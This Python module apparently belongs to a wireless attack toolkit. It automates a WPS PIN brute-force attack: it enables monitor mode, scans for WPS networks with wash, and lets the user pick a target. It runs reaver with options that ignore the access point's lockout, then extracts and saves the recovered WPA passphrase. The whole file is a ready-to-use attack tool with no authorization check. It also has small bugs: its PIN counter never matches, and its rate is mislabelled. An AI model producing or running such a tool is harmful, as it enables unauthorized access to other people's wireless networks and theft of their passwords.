#!/usr/bin/env python3

from rich.console import Console
from rich.table import Table
from rich.progress import Progress
import subprocess
import threading
import time
import os
from datetime import datetime
from modules.utils import (
    check_wireless_tools,
    get_interface,
    setup_monitor_mode,
    get_data_path,
    log_activity,
    get_temp_path,
    cleanup_temp_files
)

class WPSAttacker:
    def __init__(self):
        self.console = Console()
        self.interface = None
        self.target_bssid = None
        self.target_essid = None
        self.target_channel = None
        self.running = False
        self.pin_found = False
        self.current_pin = None
        self.psk = None
        self.pins_tested = 0
        self.start_time = None

    def scan_wps_networks(self):
        """Scan for WPS-enabled networks using wash"""
        try:
            networks = []
            temp_file = get_temp_path(f'wps_scan_{int(time.time())}')
            
            # Start wash scan
            scan_process = subprocess.Popen(
                ['wash', '-i', self.interface, '-o', temp_file],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            # Show progress while scanning
            with Progress() as progress:
                task = progress.add_task("[cyan]Scanning for WPS networks...", total=20)
                
                for i in range(20):  # Scan for 20 seconds
                    progress.update(task, advance=1)
                    
                    # Parse current results if file exists
                    if os.path.exists(temp_file):
                        try:
                            with open(temp_file, 'r', encoding='utf-8') as f:
                                lines = f.readlines()
                            
                            networks.clear()
                            for line in lines[2:]:  # Skip header lines
                                if line.strip():
                                    parts = line.strip().split('|')
                                    if len(parts) >= 5:
                                        bssid = parts[0].strip()
                                        channel = parts[1].strip()
                                        wps_version = parts[2].strip()
                                        wps_locked = parts[3].strip().lower() == 'yes'
                                        essid = parts[4].strip()
                                        
                                        if bssid and ':' in bssid:
                                            networks.append({
                                                'bssid': bssid,
                                                'channel': channel,
                                                'essid': essid,
                                                'wps_version': wps_version,
                                                'wps_locked': wps_locked
                                            })
                            
                            # Display current results
                            if networks:
                                self.display_networks(networks)
                                
                        except Exception as e:
                            self.console.print(f"[yellow]Error parsing results: {str(e)}[/yellow]")
                    
                    time.sleep(1)
            
            # Cleanup
            scan_process.terminate()
            if os.path.exists(temp_file):
                os.remove(temp_file)
            
            return networks
            
        except Exception as e:
            self.console.print(f"[red]Error during WPS scan: {str(e)}[/red]")
            return []

    def display_networks(self, networks):
        """Display WPS networks in a formatted table"""
        table = Table(title="WPS-Enabled Networks")
        table.add_column("Index", style="cyan", justify="center")
        table.add_column("BSSID", style="green")
        table.add_column("Channel", justify="center")
        table.add_column("ESSID", style="yellow")
        table.add_column("WPS Version", justify="center")
        table.add_column("Status", style="red")

        for idx, network in enumerate(networks, 1):
            table.add_row(
                str(idx),
                network['bssid'],
                network['channel'],
                network['essid'],
                network['wps_version'],
                "Locked" if network['wps_locked'] else "Unlocked"
            )

        os.system('cls' if os.name == 'nt' else 'clear')
        self.console.print(table)

    def select_target(self, networks):
        """Select target network from scan results"""
        if not networks:
            self.console.print("[yellow]No WPS-enabled networks found.[/yellow]")
            return False

        self.display_networks(networks)

        while True:
            try:
                choice = input("\nSelect target network (1-{}) or 'q' to quit: ".format(len(networks)))
                if choice.lower() == 'q':
                    return False
                    
                idx = int(choice) - 1
                if 0 <= idx < len(networks):
                    target = networks[idx]
                    if target['wps_locked']:
                        self.console.print("[yellow]Warning: WPS is locked on this network.[/yellow]")
                        if input("Continue anyway? (y/n): ").lower() != 'y':
                            return False
                    
                    self.target_bssid = target['bssid']
                    self.target_channel = target['channel']
                    self.target_essid = target['essid']
                    return True
                    
                self.console.print("[red]Invalid choice. Please try again.[/red]")
            except ValueError:
                self.console.print("[red]Invalid input. Please enter a number.[/red]")
        
        return False

    def run_reaver(self):
        """Run reaver attack with improved reliability"""
        try:
            # Prepare reaver command
            cmd = [
                'reaver',
                '-i', self.interface,
                '-b', self.target_bssid,
                '-c', self.target_channel,
                '-vv',      # Verbose output
                '-L',       # Ignore locked state
                '-N',       # Don't send NACK messages
                '-d', '2',  # 2 second delay between attempts
                '-T', '1',  # 1 second timeout
                '-r', '3:15'  # 3 retries with 15 second delay
            ]

            # Start reaver process
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                universal_newlines=True,
                bufsize=1
            )

            # Monitor output
            while self.running and process.poll() is None:
                line = process.stdout.readline()
                if not line:
                    continue
                    
                # Update progress information
                if "Trying pin" in line.lower():
                    self.pins_tested += 1
                    pin_match = line.split('"')[1] if '"' in line else None
                    if pin_match:
                        self.current_pin = pin_match
                
                # Check for success
                if "WPS PIN:" in line:
                    pin = line.split(":")[1].strip()
                    self.pin_found = True
                    self.current_pin = pin
                
                if "WPA PSK:" in line:
                    psk = line.split(":")[1].strip().strip("'")
                    self.psk = psk
                    break

                # Display status
                elapsed = time.time() - self.start_time
                rate = self.pins_tested / elapsed if elapsed > 0 else 0
                
                os.system('cls' if os.name == 'nt' else 'clear')
                self.console.print("\n[bold cyan]WPS Attack Status:[/bold cyan]")
                self.console.print(f"Target Network: {self.target_essid}")
                self.console.print(f"BSSID: {self.target_bssid}")
                self.console.print(f"Channel: {self.target_channel}")
                self.console.print(f"Current PIN: {self.current_pin}")
                self.console.print(f"PINs Tested: {self.pins_tested}")
                self.console.print(f"Rate: {rate:.2f} PINs/min")
                self.console.print(f"Elapsed Time: {int(elapsed)}s")
                self.console.print("\n[yellow]Press Ctrl+C to stop[/yellow]")

            return self.pin_found

        except Exception as e:
            self.console.print(f"[red]Error during reaver attack: {str(e)}[/red]")
            return False

    def start_attack(self):
        """Start WPS attack with improved reliability"""
        try:
            # Check requirements
            if not check_wireless_tools():
                return

            # Get wireless interface
            self.interface = get_interface()
            if not self.interface:
                return

            # Enable monitor mode
            self.console.print("\n[yellow]Enabling monitor mode...[/yellow]")
            self.interface = setup_monitor_mode(self.interface)
            if not self.interface:
                self.console.print("[red]Failed to enable monitor mode![/red]")
                return

            self.console.print("[green]Monitor mode enabled successfully![/green]")
            self.console.print(f"[cyan]Using interface: {self.interface}[/cyan]")

            # Scan for WPS networks
            self.console.print("\n[yellow]Scanning for WPS-enabled networks...[/yellow]")
            networks = self.scan_wps_networks()

            # Select target
            if not self.select_target(networks):
                return

            # Start attack
            self.console.print("\n[yellow]Starting WPS attack...[/yellow]")
            self.console.print("[cyan]Press Ctrl+C to stop[/cyan]")

            self.running = True
            self.start_time = time.time()

            # Run reaver attack
            success = self.run_reaver()

            # Save results
            if success:
                self.console.print(f"\n[green]WPS PIN found: {self.current_pin}[/green]")
                if self.psk:
                    self.console.print(f"[green]WPA PSK: {self.psk}[/green]")

                # Save to file
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                save_path = get_data_path('wps', f'wps_{timestamp}.txt')

                with open(save_path, 'w') as f:
                    f.write("WPS Attack Results\n")
                    f.write(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                    f.write(f"Target AP: {self.target_bssid}\n")
                    f.write(f"Target ESSID: {self.target_essid}\n")
                    f.write(f"WPS PIN: {self.current_pin}\n")
                    if self.psk:
                        f.write(f"WPA PSK: {self.psk}\n")
                    f.write(f"Duration: {int(time.time() - self.start_time)} seconds\n")
                    f.write(f"PINs Tested: {self.pins_tested}\n")

                self.console.print(f"\n[green]Results saved to: {save_path}[/green]")
                log_activity(f"WPS attack successful - Target: {self.target_essid}")
            else:
                self.console.print("\n[yellow]Attack completed without finding PIN[/yellow]")
                log_activity(f"WPS attack failed - Target: {self.target_essid}")

        except KeyboardInterrupt:
            self.console.print("\n[yellow]Attack stopped by user[/yellow]")
        except Exception as e:
            self.console.print(f"[red]Error during attack: {str(e)}[/red]")

        finally:
            # Cleanup
            self.running = False
            try:
                subprocess.run(['airmon-ng', 'stop', self.interface],
                             stdout=subprocess.DEVNULL,
                             stderr=subprocess.DEVNULL)
            except:
                pass

            input("\nPress Enter to continue...") 